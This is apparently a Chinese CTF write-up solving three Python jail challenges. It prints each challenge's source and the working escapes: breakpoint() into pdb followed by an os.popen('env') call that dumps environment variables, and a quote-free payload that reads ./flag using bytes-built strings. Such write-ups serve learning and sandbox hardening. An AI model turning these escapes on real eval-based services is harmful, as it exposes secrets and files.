---
layout: post
title: ez pyjail 系列 Writeup
date: 2026-09-12
Author: Florence
tags: [CTF, Python, pyjail]
categories: [CTF]
comments: true
toc: true
---

## 前言

pyjail（Python jail）是一类 Python 沙箱逃逸题目，核心是在受限的 `eval`/`exec` 环境中绕过各种过滤，执行任意代码或读取敏感文件。本文记录 ez pyjail 1、2、3 三题的解题过程。

<!-- more -->

---

## ez pyjail 1

### 题目源码

```python
print("Welcome to the python jail")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if len(input_data) > 13:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))
```

### 分析

- 目标：读取环境变量（flag 藏在环境变量里）。
- 限制：输入长度不能超过 13 个字符。
- 输入直接交给 `eval` 执行。

长度限制只针对第一次输入，只要找到一个短 payload 打开一个交互式环境，就能绕过限制。

### 利用

Python 3.7+ 内置了 `breakpoint()` 函数，调用会进入 `pdb` 调试器：

```python
breakpoint()
```

长度为 12，满足限制。进入 `(Pdb)` 后，不再受长度约束，可以直接执行 Python 代码读取环境变量：

```python
__import__('os').popen('env').read()
```

或者：

```python
!import os; print(os.environ)
```

### 结果

环境变量中直接包含 flag：

```
GZCTF_FLAG=nsilab{d87af153-32a5-4f03-9a04-b31a60426878}
```

**Flag：** `nsilab{d87af153-32a5-4f03-9a04-b31a60426878}`

---

## ez pyjail 2

### 题目源码

```python
import os
flag = os.getenv("GZCTF_FLAG", "nsilab{fake_flag}")

print("Welcome to the python jail")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if len(input_data) > 7:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))
```

### 分析

- 目标：读取 flag。
- 限制：输入长度不能超过 7 个字符。
- 关键点：flag 已经被提前读取并保存在全局变量 `flag` 中。

`eval` 在当前作用域执行，可以直接访问全局变量 `flag`，不需要任何额外操作。

### 利用

```
flag
```

长度为 4，满足限制，`eval("flag")` 直接返回 flag 变量的值。

**Flag：** 输出中的 `Answer: nsilab{...}`

---

## ez pyjail 3

### 题目源码

```python
FLAG_FILE = "./flag"
try:
    with open(FLAG_FILE, "r") as f:
        pass
except FileNotFoundError:
    import os
    with open(FLAG_FILE, "w") as f:
        f.write(os.environ.get("GZCTF_FLAG", "nsilab{fake_flag}"))
    del os
del FLAG_FILE

BANLIST = ['__loader__', '__import__', 'compile', 'eval', 'exec', 'chr']
eval_func = eval

for m in BANLIST:
    del __builtins__.__dict__[m]

del __loader__, __builtins__

def filter(s):
    not_allowed = set('"\'`')
    return any(c in not_allowed for c in s)

print("Welcome to the python jail")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
if filter(input_data):
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval_func(input_data)))
```

### 分析

**目标：** 读取 `./flag` 文件。

**限制条件：**

1. 从 `__builtins__` 中删除了 `__loader__`、`__import__`、`compile`、`eval`、`exec`、`chr`。
2. 输入中不能包含单引号 `'`、双引号 `"`、反引号 `` ` ``，即不能用字符串字面量。

**关键观察：**

- `eval` 的引用被提前保存在 `eval_func`，所以最终仍然执行了 `eval`。
- `open`、`bytes`、`str`、`.decode()` 等内置函数**没有被删除**，仍然可用。
- 不能用引号，但可以用 `bytes([...])` 通过 ASCII 码构造字符串。

### 利用

构造 `'./flag'` 字符串，各字符 ASCII 码：

| 字符 | ASCII |
|------|-------|
| `.`  | 46    |
| `/`  | 47    |
| `f`  | 102   |
| `l`  | 108   |
| `a`  | 97    |
| `g`  | 103   |

Payload：

```python
open(bytes([46,47,102,108,97,103]).decode()).read()
```

**执行流程：**

1. `bytes([46,47,102,108,97,103])` → `b'./flag'`
2. `.decode()` → `'./flag'`
3. `open('./flag')` → 打开文件
4. `.read()` → 读取全部内容并返回

整个 payload 中没有引号，也没用被禁的关键字，顺利通过 `filter` 检查。

**Flag：** 输出中的 `Answer: nsilab{...}`

---

## 总结

| 题目 | 核心限制 | 绕过思路 | Payload |
|------|----------|----------|---------|
| ez pyjail 1 | 长度 ≤ 13 | 用 `breakpoint()` 进入 pdb，再执行任意代码 | `breakpoint()` 然后 `__import__('os').popen('env').read()` |
| ez pyjail 2 | 长度 ≤ 7 | flag 已在全局变量中，直接引用 | `flag` |
| ez pyjail 3 | 禁用关键字 + 禁止引号 | 用 `bytes([...]).decode()` 构造字符串 | `open(bytes([46,47,102,108,97,103]).decode()).read()` |

**常见 pyjail 逃逸技巧：**

- `breakpoint()` 进入 `pdb` 绕过长度限制。
- 利用当前作用域中已有的变量。
- 用 `bytes([...])`、`getattr`、`__dict__` 等绕过字符串/关键字过滤。
- 关注哪些内置函数**没有被删除**，往往就是突破口。
